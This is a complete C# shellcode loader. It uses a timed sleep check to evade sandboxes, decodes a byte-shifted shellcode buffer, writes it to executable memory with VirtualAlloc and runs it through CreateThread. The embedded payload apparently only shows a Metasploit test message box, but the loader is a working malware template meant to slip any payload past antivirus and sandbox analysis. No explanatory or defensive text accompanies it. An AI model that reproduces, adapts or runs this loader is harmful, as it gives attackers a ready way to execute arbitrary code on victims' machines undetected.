using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace shellcode
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        [DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
        
			DateTime t1 = DateTime.Now;
			Sleep(10000);
			double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
			if(t2 < 7.5)
			{
				return;
			}
			
            byte[] buf = new byte[322] {0xfe, 0x4a, 0x83, 0xe6, 0xf2, 0x01, 0x01, 0x01, 0xea, 0xd2, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x40, 0x4a, 0x8d, 0x54, 0x1a, 0x40, 0x4a, 0x8d, 0x54, 0x22, 0x40, 0x4a, 0x8d, 0x74, 0x52, 0x40, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4f, 0x33, 0xcb, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x43, 0x53, 0x40, 0x4a, 0x8d, 0x54, 0x22, 0x40, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x40, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x71, 0x4a, 0x03, 0xd2, 0x52, 0x40, 0x8d, 0x4a, 0x1a, 0x40, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0xe5, 0x5e, 0x4a, 0x01, 0xcb, 0x40, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4f, 0x33, 0xcb, 0x4a, 0x33, 0xc2, 0xae, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x40, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xd8, 0x5a, 0x40, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x40, 0x43, 0x8d, 0x0e, 0x4a, 0x40, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x40, 0x43, 0x8d, 0x06, 0x8a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x40, 0x4a, 0x8d, 0x14, 0xeb, 0x4b, 0x01, 0x01, 0x01, 0x5f, 0x40, 0x4a, 0x8f, 0x8f, 0x2c, 0x03, 0x02, 0x02, 0x43, 0xbc, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x4b, 0xc9, 0xc3, 0x02, 0x02, 0x02, 0x02, 0x40, 0x4a, 0x8f, 0x97, 0x10, 0x03, 0x02, 0x02, 0x40, 0x4e, 0x8f, 0x87, 0x21, 0x03, 0x02, 0x02, 0x4a, 0x33, 0xcb, 0x43, 0xbc, 0x47, 0x85, 0x58, 0x09, 0x01, 0xd7, 0x4a, 0x33, 0xcb, 0x43, 0xbc, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7, 0x4a, 0x67, 0x6e, 0x6e, 0x71, 0x2e, 0x22, 0x68, 0x74, 0x71, 0x6f, 0x22, 0x4f, 0x55, 0x48, 0x23, 0x02, 0x4f, 0x67, 0x75, 0x75, 0x63, 0x69, 0x67, 0x44, 0x71, 0x7a, 0x02, 0x77, 0x75, 0x67, 0x74, 0x35, 0x34, 0x30, 0x66, 0x6e, 0x6e, 0x02};
            
            for(int i = 0; i < buf.Length; i++)
			{
				buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
			}
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}